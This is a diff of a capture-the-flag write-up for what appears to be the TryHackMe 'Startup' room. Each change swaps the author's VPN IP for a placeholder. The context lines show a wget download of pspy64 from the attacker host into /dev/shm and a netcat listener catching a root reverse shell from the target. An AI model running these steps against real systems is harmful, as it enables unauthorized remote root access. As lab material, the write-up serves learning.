@@ -687,7 +687,7 @@ Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-190-generic x86_64)
 30 updates are security updates.
 
 
-Last login: Sat Nov 21 12:01:37 2020 from 10.8.21.217
+Last login: Sat Nov 21 12:01:37 2020 from (VPN IP)
 $ bash
 lennie@startup:~$ ls -alh
 total 24K
@@ -761,7 +761,7 @@ lennie@startup:~/scripts$
 <pre><code class="language-highlight">lennie@startup:~/scripts$ cd /dev/shm
 lennie@startup:/dev/shm$ wget http://(VPN IP)/pspy64
 --2020-11-21 12:13:38--  http://(VPN IP)/pspy64
-Connecting to 10.8.21.217:80... connected.
+Connecting to (VPN IP):80... connected.
 HTTP request sent, awaiting response... 200 OK
 Length: 3078592 (2.9M) [application/octet-stream]
 Saving to: ‘pspy64’
@@ -792,7 +792,7 @@ lennie@startup:~/scripts$
 <pre><code class="language-highlight">┌─[daz@parrot]─[~/Documents/TryHackMe/Startup]
 └──╼ $nc -nvlp 8888
 listening on [any] 8888 ...
-connect to [10.8.21.217] from (UNKNOWN) [10.10.27.29] 34830
+connect to [(VPN IP)] from (UNKNOWN) [10.10.27.29] 34830
 bash: cannot set terminal process group (2212): Inappropriate ioctl for device
 bash: no job control in this shell
 root@startup:~# cd /root
